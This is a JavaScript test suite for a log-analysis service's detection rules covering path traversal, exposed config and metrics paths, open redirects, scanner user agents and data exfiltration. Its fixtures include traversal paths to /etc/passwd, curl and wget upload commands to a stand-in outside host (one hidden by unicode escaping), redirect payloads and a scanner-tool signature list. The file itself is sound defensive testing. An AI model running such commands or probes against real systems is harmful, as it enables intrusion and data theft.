const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const { parseLogBatch } = require("../backend/services/logParserService");
const logAnalysisService = require("../backend/services/logAnalysisService");
const findingService = require("../backend/services/findingService");
const { EVENT_AWARE_RULES } = require("../backend/services/eventAwareRules");
const {
  MAX_EVIDENCE_EXCERPT_LENGTH,
  MAX_EVIDENCE_PER_RULE,
  matchEventAwareRule,
  matchEventAwareRules,
  mergeEventAwareMatches,
  stripInternalEvidence
} = require("../backend/services/eventAwareMatcher");

const ruleCases = [
  {
    id: "TRAV_001",
    encodedPath: String.raw`/\u002e\u002e/\u002e\u002e/private/file`,
    normalizedPath: "/../../private/file",
    duplicateInput: "GET /../../private/file HTTP/1.1"
  },
  {
    id: "TRAV_002",
    encodedPath: String.raw`\u002fetc\u002fpasswd`,
    normalizedPath: "/etc/passwd",
    duplicateInput: "GET /etc/passwd HTTP/1.1"
  },
  {
    id: "PROM_001",
    encodedPath: String.raw`\u002factuator\u002fmetrics`,
    normalizedPath: "/actuator/metrics",
    duplicateInput: "GET /actuator/metrics HTTP/1.1"
  },
  {
    id: "CONF_001",
    encodedPath: String.raw`\u002fsettings\u002fconfig\u002eenv`,
    normalizedPath: "/settings/config.env",
    duplicateInput: "path=/settings/config.env"
  }
];

function jsonLines(pathValue) {
  return [
    `{"message":"request","path":"${pathValue}"}`,
    '{"message":"second request"}'
  ].join("\n");
}

describe("event-aware rule registry and matching", () => {
  it("registers the existing event-aware rules and their normalized fields", () => {
    assert.deepEqual(EVENT_AWARE_RULES.map(({ ruleId }) => ruleId), [
      "TRAV_001", "TRAV_002", "PROM_001", "CONF_001", "REDIR_001", "SCAN_001", "EXFIL_001",
      "SQLI_001", "SQLI_002", "SQLI_003", "SQLI_004", "XSS_001", "XSS_003", "XXE_001", "GRAPHQL_001",
      "SSRF_001"
    ]);
    assert.deepEqual(EVENT_AWARE_RULES.find(({ ruleId }) => ruleId === "SSRF_001"), {
      ruleId: "SSRF_001", fields: [["http", "body"], ["http", "url"], ["http", "query"]]
    });
    assert.deepEqual(EVENT_AWARE_RULES.find(({ ruleId }) => ruleId === "REDIR_001"), {
      ruleId: "REDIR_001", fields: [["http", "query"]]
    });
    assert.deepEqual(EVENT_AWARE_RULES.find(({ ruleId }) => ruleId === "EXFIL_001"), {
      ruleId: "EXFIL_001", fields: [["process", "command"]]
    });
    assert.deepEqual(EVENT_AWARE_RULES.find(({ ruleId }) => ruleId === "SCAN_001"), {
      ruleId: "SCAN_001",
      fields: [["http", "userAgent"]],
      pattern: "(?i)(sqlmap|nikto|nmap|burp|dirbuster|gobuster|zgrab|masscan)"
    });
    assert.ok(EVENT_AWARE_RULES.slice(0, 4).every(({ fields }) =>
      JSON.stringify(fields) === JSON.stringify([["http", "path"]])
    ));
  });

  it("does not match unknown or unregistered rule IDs", () => {
    const events = parseLogBatch("GET /../../etc/passwd HTTP/1.1").events;
    assert.equal(matchEventAwareRule(events, "UNKNOWN_999"), null);
    assert.deepEqual(mergeEventAwareMatches({ status: "clean", matchedRules: [] }, [
      { id: "UNKNOWN_999", type: "Unknown", severity: "CRITICAL", count: 1 }
    ]), { status: "clean", matchedRules: [] });
  });

  for (const ruleCase of ruleCases) {
    it(`${ruleCase.id} matches only its normalized HTTP path`, async () => {
      const batch = parseLogBatch(jsonLines(ruleCase.encodedPath));
      assert.equal(batch.events[0].http.path, ruleCase.normalizedPath);
      assert.equal((await logAnalysisService.analyzeLogs(batch.rawInput)).status, "clean");

      const match = matchEventAwareRule(batch.events, ruleCase.id);
      assert.equal(match.id, ruleCase.id);
      assert.equal(match.count, 1);
      assert.equal(match.evidence.length, 1);
      assert.equal(match.evidence[0].eventId, batch.events[0].eventId);
      assert.equal(match.evidence[0].excerpt, ruleCase.normalizedPath);
      assert.equal(typeof match.evidence[0].start, "number");
      assert.equal(typeof match.evidence[0].end, "number");
      assert.deepEqual(matchEventAwareRules(batch.events).map(({ id }) => id), [ruleCase.id]);
    });

    it(`${ruleCase.id} does not match a benign HTTP path`, () => {
      const batch = parseLogBatch(jsonLines("/ordinary/home"));
      assert.equal(matchEventAwareRule(batch.events, ruleCase.id), null);
    });

    it(`${ruleCase.id} does not match when the normalized HTTP path is absent`, () => {
      const batch = parseLogBatch([
        '{"message":"request without a path"}',
        '{"message":"another request"}'
      ].join("\n"));
      assert.equal(Object.hasOwn(batch.events[0], "http"), false);
      assert.equal(matchEventAwareRule(batch.events, ruleCase.id), null);
    });

    it(`${ruleCase.id} preserves the raw count and merges overlapping matches once`, async () => {
      const batch = parseLogBatch(ruleCase.duplicateInput);
      const rawDetection = await logAnalysisService.analyzeLogs(batch.rawInput);
      const rawMatch = rawDetection.matchedRules.find((rule) => rule.id === ruleCase.id);
      assert.ok(rawMatch, `expected legacy raw detection for ${ruleCase.id}`);

      const eventMatch = matchEventAwareRule(batch.events, ruleCase.id);
      const merged = mergeEventAwareMatches(rawDetection, [eventMatch, eventMatch]);
      const selectedMatches = merged.matchedRules.filter((rule) => rule.id === ruleCase.id);
      assert.equal(selectedMatches.length, 1);
      assert.equal(selectedMatches[0].count, rawMatch.count);
      assert.deepEqual(selectedMatches[0].evidence, eventMatch.evidence);
      assert.equal(selectedMatches[0].evidence[0].eventId, batch.events[0].eventId);
    });
  }

  it("keeps excerpts bounded and centered on a match in a long normalized path", () => {
    const longPath = `${"/images/"}${"a".repeat(350)}/../../etc/passwd`;
    const batch = parseLogBatch(jsonLines(longPath));
    const match = matchEventAwareRule(batch.events, "TRAV_001");
    const evidence = match.evidence[0];

    assert.ok(evidence.excerpt.length <= MAX_EVIDENCE_EXCERPT_LENGTH);
    assert.match(evidence.excerpt, /\.\.\/\.\./);
    assert.equal(evidence.start, longPath.indexOf("../"));
  });

  it("caps evidence at the first five matching events in deterministic event order", () => {
    const encodedPath = String.raw`/\u002e\u002e/\u002e\u002e/private/file`;
    const input = Array.from({ length: MAX_EVIDENCE_PER_RULE + 3 }, (_, index) =>
      `{"message":"request ${index + 1}","path":"${encodedPath}"}`
    ).join("\n");
    const events = parseLogBatch(input).events;
    const match = matchEventAwareRule(events, "TRAV_001");

    assert.equal(match.count, events.length);
    assert.equal(match.evidence.length, MAX_EVIDENCE_PER_RULE);
    assert.deepEqual(match.evidence.map((evidence) => evidence.eventId),
      events.slice(0, MAX_EVIDENCE_PER_RULE).map((event) => event.eventId));
  });

  it("produces no evidence when no registered event-aware rule matches", () => {
    const events = parseLogBatch(jsonLines("/ordinary/home")).events;
    assert.deepEqual(matchEventAwareRules(events), []);
  });

  it("does not invent an event ID when a matching event has none", () => {
    const match = matchEventAwareRule([{ http: { path: "/../../private/file" } }], "TRAV_001");
    assert.equal(match.count, 1);
    assert.deepEqual(match.evidence, []);
  });

  it("matches REDIR_001 on normalized query strings and associates evidence with matching events", () => {
    const batch = parseLogBatch([
      '{"message":"ordinary request","query":"page=2&sort=recent"}',
      '{"message":"redirect","query":"return_to=https://outside.example/path"}',
      '{"message":"ordinary request","query":"q=hello"}'
    ].join("\n"));
    const match = matchEventAwareRule(batch.events, "REDIR_001");

    assert.equal(match.count, 1);
    assert.deepEqual(match.evidence.map((item) => item.eventId), [batch.events[1].eventId]);
    assert.match(match.evidence[0].excerpt, /return_to=https:\/\/outside\.example\/path/);
  });

  it("counts repeated REDIR_001 parameters but emits one evidence record per event", () => {
    const batch = parseLogBatch([
      '{"message":"redirect","query":"next=https://one.example/a&next=https://two.example/b"}',
      '{"message":"ordinary request","query":"page=2"}'
    ].join("\n"));
    const match = matchEventAwareRule(batch.events, "REDIR_001");

    assert.equal(match.count, 2);
    assert.equal(match.evidence.length, 1);
    assert.equal(match.evidence[0].eventId, batch.events[0].eventId);
  });

  it("does not match benign, missing, or percent-encoded REDIR_001 queries", () => {
    const benign = parseLogBatch([
      '{"message":"one","query":"page=2&sort=recent"}',
      '{"message":"two","query":"search=https://docs.example/guide"}'
    ].join("\n"));
    const missing = parseLogBatch([
      '{"message":"one","path":"/go"}',
      '{"message":"two","path":"/home"}'
    ].join("\n"));
    const encoded = parseLogBatch([
      '{"message":"one","query":"next=https%3A%2F%2Fevil.example%2Fcallback"}',
      '{"message":"two","query":"page=2"}'
    ].join("\n"));

    assert.equal(matchEventAwareRule(benign.events, "REDIR_001"), null);
    assert.equal(matchEventAwareRule(missing.events, "REDIR_001"), null);
    assert.equal(matchEventAwareRule(encoded.events, "REDIR_001"), null);
  });

  it("preserves the raw REDIR_001 count on overlap and merges the rule once", async () => {
    const input = "GET /go?next=https://one.example/a&next=https://two.example/b HTTP/1.1";
    const batch = parseLogBatch(input);
    const rawDetection = await logAnalysisService.analyzeLogs(input);
    const rawCount = rawDetection.matchedRules.find((rule) => rule.id === "REDIR_001").count;
    const eventMatch = matchEventAwareRule(batch.events, "REDIR_001");
    const merged = mergeEventAwareMatches(rawDetection, [eventMatch, eventMatch]);
    const redirMatches = merged.matchedRules.filter((rule) => rule.id === "REDIR_001");

    assert.equal(redirMatches.length, 1);
    assert.equal(redirMatches[0].count, rawCount);
    assert.equal(redirMatches[0].evidence.length, 1);
    assert.equal(redirMatches[0].evidence[0].eventId, batch.events[0].eventId);
  });

  it("adds a REDIR_001 event-aware match when JSON unescaping reveals a raw-hidden query", async () => {
    const input = [
      String.raw`{"message":"redirect","query":"next\u003dhttps://outside.example/path"}`,
      String.raw`{"message":"ordinary","query":"page=2"}`
    ].join("\n");
    const batch = parseLogBatch(input);
    const rawDetection = await logAnalysisService.analyzeLogs(input);
    const eventMatch = matchEventAwareRule(batch.events, "REDIR_001");
    const merged = mergeEventAwareMatches(rawDetection, [eventMatch]);

    assert.equal(rawDetection.matchedRules.some((rule) => rule.id === "REDIR_001"), false);
    assert.equal(batch.events[0].http.query, "next=https://outside.example/path");
    assert.equal(eventMatch.count, 1);
    assert.equal(merged.status, "threat_detected");
    assert.equal(merged.matchedRules.filter((rule) => rule.id === "REDIR_001").length, 1);
    assert.equal(merged.matchedRules.find((rule) => rule.id === "REDIR_001").count, 1);
    assert.equal(eventMatch.evidence[0].eventId, batch.events[0].eventId);
  });

  it("matches EXFIL_001 only when process.command contains a transfer tool and URL", () => {
    const batch = parseLogBatch([
      '{"message":"download","process":{"command":"curl -X POST https://outside.example/upload"}}',
      '{"message":"ordinary transfer tool","process":{"command":"curl --version"}}',
      '{"message":"URL without transfer tool","process":{"command":"open https://docs.example/guide"}}',
      '{"message":"other matching command","process":{"command":"wget https://outside.example/archive"}}'
    ].join("\n"));
    const match = matchEventAwareRule(batch.events, "EXFIL_001");

    assert.equal(match.count, 2);
    assert.deepEqual(match.evidence.map((item) => item.eventId), [
      batch.events[0].eventId,
      batch.events[3].eventId
    ]);
    assert.match(match.evidence[0].excerpt, /curl.*https:\/\/outside\.example/i);
  });

  it("preserves EXFIL_001 localhost matching from the existing pattern", () => {
    const batch = parseLogBatch([
      '{"message":"local request","command":"curl http://localhost/health"}',
      '{"message":"ordinary","command":"curl --version"}'
    ].join("\n"));
    const match = matchEventAwareRule(batch.events, "EXFIL_001");

    assert.equal(match.count, 1);
    assert.equal(match.evidence[0].eventId, batch.events[0].eventId);
  });

  it("preserves raw EXFIL_001 counts on overlap and creates one Finding with event evidence", async () => {
    const input = [
      '{"message":"transfer","process":{"command":"curl -X POST https://outside.example/upload"}}',
      '{"message":"ordinary","process":{"command":"cat /var/log/app.log"}}'
    ].join("\n");
    const batch = parseLogBatch(input);
    const rawDetection = await logAnalysisService.analyzeLogs(input);
    const rawMatch = rawDetection.matchedRules.find((rule) => rule.id === "EXFIL_001");
    const eventMatch = matchEventAwareRule(batch.events, "EXFIL_001");
    const merged = mergeEventAwareMatches(rawDetection, [eventMatch, eventMatch]);
    const matches = merged.matchedRules.filter((rule) => rule.id === "EXFIL_001");
    const findings = findingService.createFindings(merged)
      .filter((finding) => finding.ruleId === "EXFIL_001");

    assert.equal(matches.length, 1);
    assert.equal(matches[0].count, rawMatch.count);
    assert.deepEqual(matches[0].evidence.map((item) => item.eventId), [batch.events[0].eventId]);
    assert.equal(findings.length, 1);
    assert.equal(findings[0].count, rawMatch.count);
    assert.deepEqual(findings[0].eventIds, [batch.events[0].eventId]);
  });

  it("adds an EXFIL_001 event-aware-only match when JSON unescaping reveals the command", async () => {
    const input = [
      String.raw`{"message":"transfer","process":{"command":"\u0063url https://outside.example/file"}}`,
      '{"message":"ordinary","process":{"command":"cat /var/log/app.log"}}'
    ].join("\n");
    const batch = parseLogBatch(input);
    const rawDetection = await logAnalysisService.analyzeLogs(input);
    const eventMatch = matchEventAwareRule(batch.events, "EXFIL_001");
    const merged = mergeEventAwareMatches(rawDetection, [eventMatch]);
    const findings = findingService.createFindings(merged);

    assert.equal(rawDetection.matchedRules.some((rule) => rule.id === "EXFIL_001"), false);
    assert.equal(batch.events[0].process.command, "curl https://outside.example/file");
    assert.equal(eventMatch.count, 1);
    assert.equal(eventMatch.evidence[0].eventId, batch.events[0].eventId);
    assert.equal(merged.status, "threat_detected");
    assert.equal(merged.matchedRules.filter((rule) => rule.id === "EXFIL_001").length, 1);
    assert.equal(findings.filter((finding) => finding.ruleId === "EXFIL_001").length, 1);
    assert.deepEqual(findings[0].eventIds, [batch.events[0].eventId]);
  });

  it("bounds EXFIL_001 evidence while keeping the full event match count", () => {
    const input = Array.from({ length: MAX_EVIDENCE_PER_RULE + 2 }, (_, index) =>
      JSON.stringify({
        message: `transfer ${index + 1}`,
        process: { command: `curl https://outside.example/file-${index + 1}` }
      })
    ).join("\n");
    const events = parseLogBatch(input).events;
    const match = matchEventAwareRule(events, "EXFIL_001");

    assert.equal(match.count, events.length);
    assert.equal(match.evidence.length, MAX_EVIDENCE_PER_RULE);
    assert.deepEqual(match.evidence.map((item) => item.eventId),
      events.slice(0, MAX_EVIDENCE_PER_RULE).map((event) => event.eventId));
  });

  it("matches SCAN_001 signatures in normalized User-Agent values across events", () => {
    const batch = parseLogBatch([
      '{"message":"browser","userAgent":"Mozilla/5.0 Chrome/120.0"}',
      '{"message":"scanner one","userAgent":"sqlmap/1.7"}',
      '{"message":"scanner two","http":{"user_agent":"nikto/2.1"}}'
    ].join("\n"));
    const match = matchEventAwareRule(batch.events, "SCAN_001");

    assert.equal(match.count, 2);
    assert.deepEqual(match.evidence.map((item) => item.eventId), [
      batch.events[1].eventId,
      batch.events[2].eventId
    ]);
    assert.match(match.evidence[0].excerpt, /sqlmap/i);
    assert.match(match.evidence[1].excerpt, /nikto/i);
  });

  it("recognizes every scanner signature listed by the existing SCAN_001 rule", () => {
    const signatures = ["sqlmap", "nikto", "nmap", "burp", "dirbuster", "gobuster", "zgrab", "masscan"];
    const events = signatures.map((signature, index) => ({
      eventId: `evt-scan-${index + 1}`,
      http: { userAgent: `Client/1.0 ${signature}/2.0` }
    }));
    const match = matchEventAwareRule(events, "SCAN_001");

    assert.equal(match.count, signatures.length);
    assert.deepEqual(match.evidence.map((item) => item.eventId),
      events.slice(0, MAX_EVIDENCE_PER_RULE).map((event) => event.eventId));
  });

  it("does not match benign, missing, empty, or unrelated User-Agent values", () => {
    const batch = parseLogBatch([
      '{"message":"browser","userAgent":"Mozilla/5.0 Chrome/120.0"}',
      '{"message":"api client","userAgent":"ExampleSDK/4.2"}',
      '{"message":"unrelated","userAgent":"crawler/1.0"}',
      '{"message":"missing"}',
      '{"message":"empty","userAgent":"  "}'
    ].join("\n"));

    assert.equal(matchEventAwareRule(batch.events, "SCAN_001"), null);
  });

  it("caps SCAN_001 evidence while retaining the full matching count", () => {
    const input = Array.from({ length: MAX_EVIDENCE_PER_RULE + 2 }, (_, index) =>
      JSON.stringify({ message: `scanner ${index}`, userAgent: `sqlmap/${index + 1}` })
    ).join("\n");
    const events = parseLogBatch(input).events;
    const match = matchEventAwareRule(events, "SCAN_001");

    assert.equal(match.count, events.length);
    assert.equal(match.evidence.length, MAX_EVIDENCE_PER_RULE);
    assert.deepEqual(match.evidence.map((item) => item.eventId),
      events.slice(0, MAX_EVIDENCE_PER_RULE).map((event) => event.eventId));
  });

  it("preserves the raw SCAN_001 count on overlap and creates one Finding with event evidence", async () => {
    const input = "User-Agent: Mozilla/5.0 sqlmap/1.7";
    const batch = parseLogBatch(input);
    const rawDetection = await logAnalysisService.analyzeLogs(input);
    const rawMatch = rawDetection.matchedRules.find((rule) => rule.id === "SCAN_001");
    const eventMatch = matchEventAwareRule(batch.events, "SCAN_001");
    const merged = mergeEventAwareMatches(rawDetection, [eventMatch, eventMatch]);
    const matches = merged.matchedRules.filter((rule) => rule.id === "SCAN_001");
    const findings = findingService.createFindings(merged)
      .filter((finding) => finding.ruleId === "SCAN_001");

    assert.equal(matches.length, 1);
    assert.equal(matches[0].count, rawMatch.count);
    assert.deepEqual(matches[0].evidence.map((item) => item.eventId), [batch.events[0].eventId]);
    assert.equal(findings.length, 1);
    assert.equal(findings[0].count, rawMatch.count);
    assert.deepEqual(findings[0].eventIds, [batch.events[0].eventId]);
  });

  it("adds a SCAN_001 event-aware-only match when JSON User-Agent is raw-hidden", async () => {
    const input = [
      '{"message":"request","userAgent":"nikto/2.1"}',
      '{"message":"ordinary request","userAgent":"ExampleSDK/4.2"}'
    ].join("\n");
    const batch = parseLogBatch(input);
    const rawDetection = await logAnalysisService.analyzeLogs(input);
    const eventMatch = matchEventAwareRule(batch.events, "SCAN_001");
    const merged = mergeEventAwareMatches(rawDetection, [eventMatch]);
    const findings = findingService.createFindings(merged);

    assert.equal(rawDetection.matchedRules.some((rule) => rule.id === "SCAN_001"), false);
    assert.equal(eventMatch.count, 1);
    assert.equal(merged.status, "threat_detected");
    assert.equal(merged.matchedRules.filter((rule) => rule.id === "SCAN_001").length, 1);
    assert.equal(findings.filter((finding) => finding.ruleId === "SCAN_001").length, 1);
    assert.deepEqual(findings[0].eventIds, [batch.events[0].eventId]);
  });

  it("strips internal evidence from the public detection shape", () => {
    const detection = {
      status: "threat_detected",
      type: "Path Traversal",
      severity: "HIGH",
      matchedRules: [{
        id: "TRAV_001",
        count: 1,
        eventIds: ["evt-1"],
        evidence: [{ eventId: "evt-1", excerpt: "/../" }]
      }]
    };
    const publicDetection = stripInternalEvidence(detection);

    assert.deepEqual(publicDetection, {
      status: "threat_detected",
      type: "Path Traversal",
      severity: "HIGH",
      matchedRules: [{ id: "TRAV_001", count: 1 }]
    });
  });
});
